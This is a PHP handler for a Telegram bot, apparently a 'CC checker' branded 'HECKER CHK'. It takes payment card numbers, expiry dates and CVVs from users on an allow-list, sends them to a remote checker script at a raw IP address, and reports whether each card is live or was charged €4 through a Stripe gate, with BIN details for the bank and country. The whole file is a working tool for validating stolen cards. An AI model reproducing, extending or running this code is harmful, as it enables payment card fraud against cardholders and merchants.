<?php
if ((strpos($message, "/spp") === 0)||(strpos($message, "!spp") === 0)||(strpos($message, ".spp") === 0)){
$pro = file_get_contents('pre.txt');
$pros = explode("\n", $pro);
if (in_array($chatId, $pros)) {
sendaction($chatId, typing);
$message = substr($message, 4);
$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
  
      $lista = "$cc|$mes|$ano|$cvv";
     $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] CC: ".$lista."%0A[ϟ] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
  
    $sent = json_decode(file_get_contents($sendmes) ,1);
      $mes_id = $sent['result']['message_id'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://20.212.107.64/sendnudez/Hcaptcha/chk.php?lista='.$lista.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$fimaa = curl_exec($ch);

$msg = trim(strip_tags(getStr($fimaa,' <br>Result:','</span><br>')));

if (strpos($fimaa, "INSUFFICIENT FUNDS") || strpos($fimaa, "CVV LIVE")) {
  $pass = 'CVV MATCHED ✅';
}
  if (strpos($fimaa, "TRANSACTION NOT ALLOWED") || strpos($fimaa, "3DS2")) {
  $pass = 'CVV MATCHED ✅';
}
if (strpos($fimaa, "Security code is incorrect") || strpos($fimaa, "CCN CC")) {
  $pass = 'CVC MISMATCH ✅';
}

  if (strpos($fimaa, "€4 Charged ✅") || strpos($fimaa, "CHARGED CC")) {
  $pass = 'CVC CHECK PASS ✅';
}
  if (strpos($fimaa, "Error updating default payment method. Your card was declined.") || strpos($fimaa, "Your card was declined.")) {
  $pass = 'DECLINED ❌';
}

  $bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
if(strpos($fim, '"type":"Credit"') !== false){
};
   $bug = file_get_contents('bugdb.txt');
$bugs = explode("\n", $bug);
if (in_array($bin, $bugs)) {
$isbug = $t;
}
else {
$isbug = $f;
}
  $binrs = "<b>━━━━━━━━━━━━━%0A[ϟ] BIN: $bin%0A[ϟ] COUNTRY: $country $emoji%0A[ϟ] BRAND: $brand%0A[ϟ] LEVEL: $scheme%0A[ϟ] TYPE: $type%0A[ϟ] BANK: $bank</b>";
$time_end = microtime(true);
  $execution_time = ($time_end - $time_start);
 editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE CHARGE €4%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
}

else {
  sendMessage($chatId, "<b>You are not authorized to use this command in here.You can use me in @heckerdrops chat or get authorization.</b>", $message_id);
}
}